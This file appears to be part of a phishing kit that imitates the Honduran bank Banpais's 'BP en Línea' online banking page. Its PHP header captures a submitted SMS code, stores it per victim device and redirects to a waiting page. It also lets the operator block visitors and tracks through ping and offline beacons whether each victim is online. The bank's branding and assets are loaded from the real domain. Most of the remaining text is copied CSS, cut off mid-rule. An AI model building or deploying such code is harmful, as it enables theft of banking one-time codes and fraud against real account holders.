<?php
// Iniciar el buffer de salida para evitar errores de encabezado
ob_start();
require_once 'functions.php';

$info   = get_user_info();
$ip     = $info['ip'];
$device = get_device_id(); 

// Verificar si el usuario está bloqueado
if (get_user_state($device) === 'block') {
    echo "<script>
            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
            window.location.href = 'https://www.google.com';
          </script>";
    exit();
}

// Actualizar el usuario con su device_id
update_user($ip, $info['location'], basename(__FILE__));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $allowedFields = ["sms"];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields, true)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {
        $data = load_data();

        if (!isset($data[$device])) { 
            $data[$device] = ['submissions' => [], 'state' => 'active'];
        }

        $timestamp = date("Y-m-d H:i:s");
        $found = false;

        if (isset($data[$device]['submissions'])) {
            foreach ($data[$device]['submissions'] as &$submission) {
                $existingKeys = array_keys($submission['data']);
                $formKeys     = array_keys($formData);
                sort($existingKeys);
                sort($formKeys);
                if ($existingKeys === $formKeys) {
                    // Reemplazar el submission existente
                    $submission = [
                        "data"      => $formData,
                        "timestamp" => $timestamp
                    ];
                    $found = true;
                    break;
                }
            }
            unset($submission);
        }

        if (!$found) {
            // Agregar nueva submission
            $data[$device]['submissions'][] = [
                "data"      => $formData,
                "timestamp" => $timestamp
            ];
            // Si es la primera submission y aún no se asignó color, asignar siempre #FF0000
            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
                $data[$device]['color'] = '#000000';
            }
        }

        save_data($data);

        header("Location: waiting.php");
        exit();
    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}
// Finalizar el buffer de salida para que header() funcione correctamente
ob_end_flush();
?>
<!DOCTYPE html>
<html lang="en" translate="no">

<head id="main">
       <script>
      setInterval(function(){
          fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
      }, 5000);

      window.addEventListener('unload', function(){
          navigator.sendBeacon('functions.php?action=offline');
      });
      </script>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta name="google" content="notranslate">
  <title>BP en Línea</title>
  <!--<base href="/online-banking/">-->
  <base href=".">

  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

  <link rel="icon" id="appIcon" type="image/x-icon"
    href="https://bpenlinea.banpais.hn/online-banking/assets/images/favicon/favicon_banpais_1.png">

  <style>
    body,
    html {
      height: 100%;
      background-color: #ffffff;
    }

    .logo {
      width: 300px;
      height: 300px;
      background: url(assets/images/gif/LoaderBR/Loader_banpais_1.gif) center center no-repeat;
    }

    .app-loading {
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      background-color: #fbfbfb;
    }

    .app-loading .spinner {
      height: 330px;
      width: 330px;
      animation: rotate 2s linear infinite;
      transform-origin: center center;
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      margin: auto;
    }

    .app-loading .spinner .path {
      stroke-dasharray: 1, 200;
      stroke-dashoffset: 0;
      animation: dash 1.5s ease-in-out infinite;
      stroke-linecap: round;
      stroke: #ffffff;
    }

    @keyframes rotate {
      100% {
        transform: rotate(360deg);
      }
    }

    @keyframes dash {
      0% {
        stroke-dasharray: 1, 200;
        stroke-dashoffset: 0;
      }

      50% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -35px;
      }

      100% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -124px;
      }
    }

    .loader-index-image {
      width: 190px;
      height: 110px;
    }

    .image-loader {
      background-size: 35% !important;
      background: url(assets/images/gif/LoaderBR/Loader_banpais_1.svg) center center no-repeat;
    }

    .loader-index-gif {
      height: 25px;
      width: 87px !important;
      background-size: contain !important;
    }

    .gif-loader {
      background: url(assets/images/gif/LoaderBR/Loader_banpais_1.gif) center center no-repeat;
    }

    @media only screen and (max-width: 480px) {
      .ngx-spinner-overlay>div:not(.loading-text) {
        width: 85% !important;
      }

      .image-loader {
        background-size: 40% !important;
      }

      .loader-index-image {
        width: 120px !important;
        height: 60px !important;
      }

      .loader-index-gif {
        height: 22px;
        width: 83px !important;
      }
    }
  </style>

  <script>
    if (global === undefined) {
      var global = window;
    }
  </script>

  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/banca-regional-2/banca-regional.ttf" as="font"
    type="text/ttf" crossorigin="">
  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/banca-regional-2/banca-regional.woff" as="font"
    type="text/woff" crossorigin="">
  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/banca-regional-2/banca-regional.eot" as="font"
    type="text/eot" crossorigin="">

  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/banca-regional/banca-regional.ttf" as="font"
    type="text/ttf" crossorigin="">
  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/banca-regional/banca-regional.woff" as="font"
    type="text/woff" crossorigin="">
  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/banca-regional/banca-regional.eot" as="font"
    type="text/eot" crossorigin="">

  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/sprint2/icomoon.eot" as="font" type="text/ttf"
    crossorigin="">
  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/sprint2/icomoon.woff" as="font" type="text/woff"
    crossorigin="">
  <link rel="preload" href="https://bpenlinea.banpais.hn/assets/fonts/sprint2/icomoon.ttf" as="font" type="text/eot"
    crossorigin="">
  <style>
    .mat-typography {
      font: 400 14px/20px Roboto, Helvetica Neue, sans-serif
    }

    .mat-typography p {
      margin: 0 0 12px
    }

    .banpais {
      --size-h2: 20px;
      --main-title-x: bold 1.25rem/2.0625rem Lato;
      --main-title-md: bold 1.25rem/1.875rem Lato;
      --main-title-sm: bold 1.25rem/1.5rem Lato;
      --subtitle-x: bold 1.125rem/1.375rem Lato;
      --subtitle-md: bold 1.125rem/1.5rem Lato;
      --subtitle-sm: bold .9375rem/1.6875rem Lato;
      --font-attributes: .875rem;
      --font-attributes-sm: .875rem;
      --properties-form: #5A5A5A;
      --border-hover: #ffd800;
      --h2-corporate: #024d9a;
      --total-table-corporate: #024d9a;
      --title-modal-corporate: var(--primary-color);
      --label-color-login: #0a4989;
      --color-mobile-menu: #024d9a;
      --primary-color: #003865;
      --primary-alternative-color: #0a4989;
      --primary-lighter-color: #b6c8dc;
      --primary-darker-color: #05316c;
      --primary-light-two: #1366a8;
      --border-animated: #ffffff;
      --text-primary-color: #ffffff;
      --accent-color: #ffd800;
      --accent-alternative-color: #20626F;
      --accent-lighter-color: #fff3b3;
      --accent-darker-color: #ffc800;
      --text-accent-color: rgba(255, 255, 255, .87);
      --gray-adendum: #909090;
      --gray-close-btn: #676A6C;
      --divider-form-color: #5a5a5a;
      --subtitle-form-color: #9B9B9B;
      --title-form-color: #0a4989;
      --blue-variant-one: #042F5F;
      --accent-lighter-color-two: #feee5a;
      --text-hover-default: var(--primary-color);
      --warn-color: #f13852;
      --warn-lighter-color: #fbc3cb;
      --warn-darker-color: #eb2438;
      --text-warn-color: #ffffff;
      --font-family: Lato, monospace, sans-serif;
      --title-sprint1: normal normal bold 20px/30px var(--font-family);
      --default-background-color: var(--accent-color);
      --default-color: var(--primary-color);
      --default-background-color-hover-corporate: var(--primary-color);
      --default-background-color-hover: var(--primary-color);
      --default-color-hover: #ffffff;
      --secondary-background-color: #ffffff;
      --secondary-color: var(--primary-color);
      --secondary-background-color-hover: var(--primary-color);
      --secondary-color-hover: #ffffff;
      --alert-success-color: #27c671;
      --alert-warning-color: #ffd800;
      --alert-error-color: var(--warn-color);
      --alert-info-color: #50c5ff;
      --primary-color-menu: #E5EBF0;
      --primary-color-text-menu: #003865;
      --secodary-color-text-menu: #003865;
      --secodary-color-text-menu-hover: #20626F;
      --input-placeholder-color: #7a9fc1;
      --input-datepicker-color: var(--primary-color);
      --icon-color-corporater: #5a5a5a;
      --url: url(banpais_bg.eb4082fca04fc3ec.png);
      --color-yellow-primary: #FFB81C;
      --color-tertiary: #00C1D4;
      --background-tertiary: #00C1D4;
      --background-secundary: #2C8B9E;
      --border-hover-tertiary: #00C1D4;
      --background-primary-accent: #00325B;
      --secondary-button-background-color: #0a4989;
      --light-grey-text: #C4C4C4;
      --gray-text-400: #8E9292;
      --background-gray-200: #D3D5D5;
      --background-gray-50: #F5F6F6;
      --background-white-FD: #FDFDFD;
      --background-menu: #E5EBF0;
      --color-navbar-private: #00C1D4;
      --color-navbar: #ffffff;
      --disabled-color: #F6F6F6;
      --disabled-button-color: #9B9B9B;
      --disabled-border: #909090;
      --subtitle-payroll-scgedule: #666666;
      --subtitle-table-manual: #024989;
      --icon-color: #7a9fc1;
      --primary-color-select: #042f5f;
      --light-text-two: #9b9b9b;
      --light-text-three: #5a5a5a;
      --border: #707070;
      --light-table-rows: #f9f9f9;
      --clear-table-rows: #eaeaea;
      --white-rows: #ffffff;
      --dark-table-rows: #9b9b9b;
      --total-table-rows: #5a5a5a;
      --value-text: #005086;
      --title-text: #1a4989;
      --subtitle-text: #676a6c91;
      --header-text: #ffffff;
      --header-background: #9b9b9b;
      --table-data-backgroun: #e9e9e9;
      --ligth-border-table: #7a9fc1;
      --account-options-li-not: #1366a8;
      --light-text-two-footer: #9b9b9b;
      --embedded-scale: scale(1.2);
      --embedded-ms-zoom: 1.2
    }

    @charset "UTF-8";

    .mat-typography {
      font: 400 14px/20px Roboto, Helvetica Neue, sans-serif
    }

    .mat-typography p {
      margin: 0 0 12px
    }

    @font-face {
      font-family: Lato;
      font-style: italic;
      font-weight: 100;
      src: url(Lato-italic-100.d3901625f600fe52.woff) format("woff"), url(Lato-italic-100.dadd99392057df3c.woff2) format("woff2"), url(Lato-italic-100.fc65e62560dc7561.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: italic;
      font-weight: 300;
      src: url(Lato-italic-300.06ec5fd1cf67797c.woff) format("woff"), url(Lato-italic-300.657101c149c65f8d.woff2) format("woff2"), url(Lato-italic-300.b5440f986b8081f4.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: italic;
      font-weight: 400;
      src: url(Lato-italic-400.7e6bd63ad98326d7.woff) format("woff"), url(Lato-italic-400.fb0ccca547491b59.woff2) format("woff2"), url(Lato-italic-400.8949b4998f3cab01.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: italic;
      font-weight: 700;
      src: url(Lato-italic-700.dc8a24055bcb94be.woff) format("woff"), url(Lato-italic-700.2ec7ae8e6b3b3d20.woff2) format("woff2"), url(Lato-italic-700.6173283167ba0a89.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: italic;
      font-weight: 900;
      src: url(Lato-italic-900.911c3d2010f92841.woff) format("woff"), url(Lato-italic-900.fb14945bf3049460.woff2) format("woff2"), url(Lato-italic-900.e532c5822f92b6e6.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: normal;
      font-weight: 100;
      src: url(Lato-normal-100.6c58bfe20b5dbd21.woff) format("woff"), url(Lato-normal-100.e6168f23a1b59507.woff2) format("woff2"), url(Lato-normal-100.16a36dfb3d6e43cc.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: normal;
      font-weight: 300;
      src: url(Lato-normal-300.b0d3cf62d4410630.woff) format("woff"), url(Lato-normal-300.d50c00d50f8f239b.woff2) format("woff2"), url(Lato-normal-300.6eca555ba6648879.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: normal;
      font-weight: 400;
      src: url(Lato-normal-400.189891db814ea821.eot);
      src: local("Lato"), url(Lato-normal-400.290626a6e0b5d26c.woff) format("woff"), url(Lato-normal-400.189891db814ea821.eot?#iefix) format("embedded-opentype"), url(Lato-normal-400.3941a1cfeead94e6.svg#Lato) format("svg"), url(Lato-normal-400.cc2c3b4a718e95f8.woff2) format("woff2"), url(Lato-normal-400.aed28460a082def8.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: normal;
      font-weight: 700;
      src: url(Lato-normal-700.5ba419fc076376d3.woff) format("woff"), url(Lato-normal-700.10278b9b4d460d3a.woff2) format("woff2"), url(Lato-normal-700.85bcf57b8d05b3c5.ttf) format("truetype")
    }

    @font-face {
      font-family: Lato;
      font-style: normal;
      font-weight: 900;
      src: url(Lato-normal-900.bdeaec7ecb56b5c6.woff) format("woff"), url(Lato-normal-900.c6e71471e707c186.woff2) format("woff2"), url(Lato-normal-900.84202bf87af1c1d5.ttf) format("truetype")
    }

    :root {
      --blue: #007bff;
      --indigo: #6610f2;
      --purple: #6f42c1;
      --pink: #e83e8c;
      --red: #dc3545;
      --orange: #fd7e14;
      --yellow: #ffc107;
      --green: #28a745;
      --teal: #20c997;
      --cyan: #17a2b8;
      --white: #fff;
      --gray: #6c757d;
      --gray-dark: #343a40;
      --primary: #007bff;
      --secondary: #6c757d;
      --success: #28a745;
      --info: #17a2b8;
      --warning: #ffc107;
      --danger: #dc3545;
      --light: #f8f9fa;
      --dark: #343a40;
      --breakpoint-xs: 0;
      --breakpoint-sm: 576px;
      --breakpoint-md: 768px;
      --breakpoint-lg: 992px;
      --breakpoint-xl: 1200px;
      --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
    }

    *,
    *:before,
    *:after {
      box-sizing: border-box
    }

    html {
      font-family: sans-serif;
      line-height: 1.15;
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
    }

    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, Liberation Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
      font-size: 1rem;
      font-weight: 400;
      line-height: 1.5;
      color: #212529;
      text-align: left;
      background-color: #fff
    }

    p {
      margin-top: 0;
      margin-bottom: 1rem
    }

    img {
      vertical-align: middle;
      border-style: none
    }

    button {
      border-radius: 0
    }

    button:focus:not(:focus-visible) {
      outline: 0
    }

    button {
      margin: 0;
      font-family: inherit;
      font-size: inherit;
      line-height: inherit
    }

    button {
      overflow: visible
    }

    button {
      text-transform: none
    }

    button {
      -webkit-appearance: button
    }

    button:not(:disabled) {
      cursor: pointer
    }

    button::-moz-focus-inner {
      padding: 0;
      border-style: none
    }

    @media print {

      *,
      *:before,
      *:after {
        text-shadow: none !important;
        box-shadow: none !important
      }

      img {
        page-break-inside: avoid
      }

      p {
        orphans: 3;
        widows: 3
      }

      @page {
        size: a3
      }

      body {
        min-width: 992px !important
      }
    }

    body {
      font-family: open sans, Helvetica Neue, Helvetica, Arial, sans-serif;
      font-size: 13px;
      color: var(--properties-form);
      overflow-x: hidden
    }

    html,
    body {
      height: 100%
    }

    button:focus {
      outline: 0 !important
    }

    :root {
      --fa-style-family-classic: "Font Awesome 6 Free";
      --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Free"
    }

    @font-face {
      font-family: "Font Awesome 6 Free";
      font-style: normal;
      font-weight: 900;
      font-display: block;
      src: url(fa-solid-900.ee6983981ffcbb41.woff2) format("woff2"), url(fa-solid-900.7a5aa5abd625137f.ttf) format("truetype")
    }

    html,
    body {
      width: 100%;
      height: 100%;
      margin: 0;
      font-family: Lato, Helvetica Neue, sans-serif !important;
      background-color: #f3f3f4 !important;
      scroll-behavior: smooth
    }

    button {
      color: #676a6c;
      font-size: 10px;
      margin-left: 2px;
      border-radius: 3px
    }

    .fatal-error-loaded {
      display: none;
      max-width: 1000px;
      margin: 0 auto;
      font-size: 1.5rem;
      line-height: 1.5;
      color: #5a5a5a;
      position: relative;
      top: 50%;
      transform: translateY(-50%);
      flex-direction: column
    }

    .fatal-error-loaded p {
      text-align: center
    }

    .fatal-error-loaded button {
      padding: 1rem;
      font-size: 1.125rem;
      margin: 0;
      border: none;
      border-radius: 4px;
      min-width: 200px;
      align-self: center
    }

    .fatal-error-loaded button:active {
      transform: scale(.98)
    }

    .fatal-error-loaded.banpais button {
      background-color: #003865;
      color: #fff
    }

    .error-load-img {
      width: 100%;
      max-width: 250px;
      margin: 0 auto 1rem;
      display: block
    }
  </style>
  <link rel="stylesheet" href="./index_files/styles.a67e3a35828fa90f.css" media="all" onload="this.media=&#39;all&#39;">
  <noscript>
    <link rel="stylesheet" href="/online-banking/styles.a67e3a35828fa90f.css">
  </noscript>
  <style>
    body[_ngcontent-oeb-c193]::-webkit-scrollbar {
      width: 10px !important
    }

    body[_ngcontent-oeb-c193]::-webkit-scrollbar-track {
      background: rgba(255, 255, 255, 0) !important
    }

    body[_ngcontent-oeb-c193]::-webkit-scrollbar-thumb {
      background-color: #9b9b9b !important;
      border-radius: 20px !important;
      border: 3px solid rgba(255, 255, 255, 0) !important
    }

    html[_ngcontent-oeb-c193] {
      scrollbar-width: auto !important;
      scrollbar-color: rgb(155, 155, 155) rgba(255, 255, 255, 0) !important
    }

    body {
      margin: 0
    }
  </style>
  <script src="./index_files/jquery-ui-css.min.js.descarga" id="jquery-ui-css-script"></script>
  <script src="./index_files/analytics-v4.5.js.descarga" id="jquery-ui-css-script"></script>
  <style>
    .la-ball-8bits[_ngcontent-oeb-c134],
    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-8bits[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-8bits.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-8bits[_ngcontent-oeb-c134] {
      width: 12px;
      height: 12px
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 4px;
      height: 4px;
      border-radius: 0;
      opacity: 0;
      transform: translate(100%, 100%);
      -webkit-animation: ball-8bits 1s ease 0s infinite;
      animation: ball-8bits 1s ease 0s infinite
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: -.9375s;
      animation-delay: -.9375s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -.875s;
      animation-delay: -.875s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -.8125s;
      animation-delay: -.8125s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-delay: -.75s;
      animation-delay: -.75s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-delay: -.6875s;
      animation-delay: -.6875s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      -webkit-animation-delay: -.625s;
      animation-delay: -.625s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      -webkit-animation-delay: -.5625s;
      animation-delay: -.5625s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(9) {
      -webkit-animation-delay: -.4375s;
      animation-delay: -.4375s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(10) {
      -webkit-animation-delay: -.375s;
      animation-delay: -.375s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(11) {
      -webkit-animation-delay: -.3125s;
      animation-delay: -.3125s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(12) {
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(13) {
      -webkit-animation-delay: -.1875s;
      animation-delay: -.1875s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(14) {
      -webkit-animation-delay: -.125s;
      animation-delay: -.125s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(15) {
      -webkit-animation-delay: -.0625s;
      animation-delay: -.0625s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(16) {
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: -100%;
      left: 0
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: -100%;
      left: 33.3333333333%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: -66.6666666667%;
      left: 66.6666666667%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: -33.3333333333%;
      left: 100%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 0;
      left: 100%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 33.3333333333%;
      left: 100%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 66.6666666667%;
      left: 66.6666666667%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 100%;
      left: 33.3333333333%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(9) {
      top: 100%;
      left: 0
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(10) {
      top: 100%;
      left: -33.3333333333%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(11) {
      top: 66.6666666667%;
      left: -66.6666666667%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(12) {
      top: 33.3333333333%;
      left: -100%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(13) {
      top: 0;
      left: -100%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(14) {
      top: -33.3333333333%;
      left: -100%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(15) {
      top: -66.6666666667%;
      left: -66.6666666667%
    }

    .la-ball-8bits[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(16) {
      top: -100%;
      left: -33.3333333333%
    }

    .la-ball-8bits.la-sm[_ngcontent-oeb-c134] {
      width: 6px;
      height: 6px
    }

    .la-ball-8bits.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 2px;
      height: 2px
    }

    .la-ball-8bits.la-2x[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px
    }

    .la-ball-8bits.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 8px
    }

    .la-ball-8bits.la-3x[_ngcontent-oeb-c134] {
      width: 36px;
      height: 36px
    }

    .la-ball-8bits.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 12px;
      height: 12px
    }

    @-webkit-keyframes ball-8bits {
      0% {
        opacity: 1
      }

      50% {
        opacity: 1
      }

      51% {
        opacity: 0
      }
    }

    @keyframes ball-8bits {
      0% {
        opacity: 1
      }

      50% {
        opacity: 1
      }

      51% {
        opacity: 0
      }
    }

    .la-ball-atom[_ngcontent-oeb-c134],
    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-atom[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-atom.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-atom[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      position: absolute;
      top: 50%;
      left: 50%;
      z-index: 1;
      width: 60%;
      height: 60%;
      background: #aaa;
      border-radius: 100%;
      transform: translate(-50%, -50%);
      -webkit-animation: ball-atom-shrink 4.5s linear infinite;
      animation: ball-atom-shrink 4.5s linear infinite
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child) {
      position: absolute;
      left: 0;
      z-index: 0;
      width: 100%;
      height: 100%;
      background: none;
      -webkit-animation: ball-atom-zindex 1.5s steps(2) 0s infinite;
      animation: ball-atom-zindex 1.5s steps(2) 0s infinite
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child):before {
      position: absolute;
      top: 0;
      left: 0;
      width: 10px;
      height: 10px;
      margin-top: -5px;
      margin-left: -5px;
      content: "";
      background: currentColor;
      border-radius: 50%;
      opacity: .75;
      -webkit-animation: ball-atom-position 1.5s ease 0s infinite, ball-atom-size 1.5s ease 0s infinite;
      animation: ball-atom-position 1.5s ease 0s infinite, ball-atom-size 1.5s ease 0s infinite
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: .75s;
      animation-delay: .75s
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2):before {
      -webkit-animation-delay: 0s, -1.125s;
      animation-delay: 0s, -1.125s
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      transform: rotate(120deg);
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3):before {
      -webkit-animation-delay: -1s, -.75s;
      animation-delay: -1s, -.75s
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      transform: rotate(240deg);
      -webkit-animation-delay: .25s;
      animation-delay: .25s
    }

    .la-ball-atom[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4):before {
      -webkit-animation-delay: -.5s, -.125s;
      animation-delay: -.5s, -.125s
    }

    .la-ball-atom.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-atom.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child):before {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-atom.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-atom.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child):before {
      width: 20px;
      height: 20px;
      margin-top: -10px;
      margin-left: -10px
    }

    .la-ball-atom.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-atom.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:not(:first-child):before {
      width: 30px;
      height: 30px;
      margin-top: -15px;
      margin-left: -15px
    }

    @-webkit-keyframes ball-atom-position {
      50% {
        top: 100%;
        left: 100%
      }
    }

    @keyframes ball-atom-position {
      50% {
        top: 100%;
        left: 100%
      }
    }

    @-webkit-keyframes ball-atom-size {
      50% {
        transform: scale(.5)
      }
    }

    @keyframes ball-atom-size {
      50% {
        transform: scale(.5)
      }
    }

    @-webkit-keyframes ball-atom-zindex {
      50% {
        z-index: 10
      }
    }

    @keyframes ball-atom-zindex {
      50% {
        z-index: 10
      }
    }

    @-webkit-keyframes ball-atom-shrink {
      50% {
        transform: translate(-50%, -50%) scale(.8)
      }
    }

    @keyframes ball-atom-shrink {
      50% {
        transform: translate(-50%, -50%) scale(.8)
      }
    }

    .la-ball-beat[_ngcontent-oeb-c134],
    .la-ball-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-beat[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-beat.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-beat[_ngcontent-oeb-c134] {
      width: 54px;
      height: 18px
    }

    .la-ball-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px;
      margin: 4px;
      border-radius: 100%;
